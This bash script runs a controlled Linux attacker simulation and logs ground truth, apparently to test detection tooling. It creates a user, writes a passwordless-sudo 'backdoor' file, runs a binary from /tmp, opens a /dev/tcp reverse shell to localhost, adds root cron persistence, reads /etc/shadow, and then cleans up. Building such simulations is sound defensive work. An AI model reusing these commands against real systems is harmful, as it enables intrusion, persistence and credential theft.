#!/bin/bash
# name: 11-linux_attack_sim.sh
# purpose: Controlled Linux attacker simulation
# author: analyst

set -e

OUTPUT_FILE="$(dirname "$0")/linux_attack_log.json"
TEST_USER="testattacker"
SUDOERS_FILE="/etc/sudoers.d/backdoor"
SUSPICIOUS_BIN="/tmp/suspicious_bin"
CRON_FILE="/etc/cron.d/persistence_test"
BEACON_FILE="/tmp/beacon.sh"

ACTIONS="[]"
COUNT=0

get_timestamp() {
    date -u +"%Y-%m-%dT%H:%M:%SZ"
}

add_action() {
    COUNT=$((COUNT + 1))
    ACTION_NUMBER="$1"
    DESCRIPTION="$2"
    TIMESTAMP="$3"

    ACTIONS=$(printf '%s' "$ACTIONS" | jq \
        --argjson number "$ACTION_NUMBER" \
        --arg description "$DESCRIPTION" \
        --arg timestamp "$TIMESTAMP" \
        '. + [{
            action_number: $number,
            description: $description,
            timestamp: $timestamp
        }]')
}

cleanup() {
    echo "[*] Cleaning up artifacts..."
    userdel "$TEST_USER" 2>/dev/null || true
    rm -f "$SUDOERS_FILE"
    rm -f "$SUSPICIOUS_BIN"
    rm -f "$CRON_FILE"
    rm -f "$BEACON_FILE"
    pkill -f "127.0.0.1/4444" 2>/dev/null || true
    echo "    [CLEAN]"
}
trap cleanup EXIT

echo "[*] Running Linux attacker simulation..."

echo -n "    [1/6] Creating user testattacker..."
userdel "$TEST_USER" 2>/dev/null || true
useradd "$TEST_USER"
TS=$(get_timestamp)
add_action 1 "Create user testattacker" "$TS"
echo " $TS"

echo -n "    [2/6] Modifying sudoers..."
echo "testattacker ALL=(ALL) NOPASSWD:ALL" > "$SUDOERS_FILE"
chmod 440 "$SUDOERS_FILE"
TS=$(get_timestamp)
add_action 2 "Modify sudoers" "$TS"
echo " $TS"

echo -n "    [3/6] Executing from /tmp..."
cp /usr/bin/id "$SUSPICIOUS_BIN"
chmod +x "$SUSPICIOUS_BIN"
"$SUSPICIOUS_BIN" >/dev/null
TS=$(get_timestamp)
add_action 3 "Execute binary from /tmp" "$TS"
echo " $TS"

echo -n "    [4/6] Reverse shell attempt (localhost)..."
bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 &' 2>/dev/null || true
sleep 1
kill %1 2>/dev/null || true
TS=$(get_timestamp)
add_action 4 "Attempt reverse shell to localhost" "$TS"
echo " $TS"

echo -n "    [5/6] Cron persistence..."
echo '#!/bin/bash' > "$BEACON_FILE"
echo "echo controlled-simulation >/dev/null" >> "$BEACON_FILE"
chmod +x "$BEACON_FILE"
echo "* * * * * root /tmp/beacon.sh" > "$CRON_FILE"
chmod 644 "$CRON_FILE"
TS=$(get_timestamp)
add_action 5 "Modify crontab" "$TS"
echo " $TS"

echo -n "    [6/6] Accessing /etc/shadow..."
cat /etc/shadow > /dev/null
TS=$(get_timestamp)
add_action 6 "Access sensitive file /etc/shadow" "$TS"
echo " $TS"

jq -n \
    --arg timestamp_format "UTC ISO 8601" \
    --argjson actions "$ACTIONS" \
    --argjson count "$COUNT" \
    '{
        simulation: "Linux Attacker Simulation",
        timestamp_format: $timestamp_format,
        actions_executed: $count,
        actions: $actions
    }' > "$OUTPUT_FILE"

echo "Actions executed: $COUNT"
echo "Ground truth saved to: $OUTPUT_FILE"
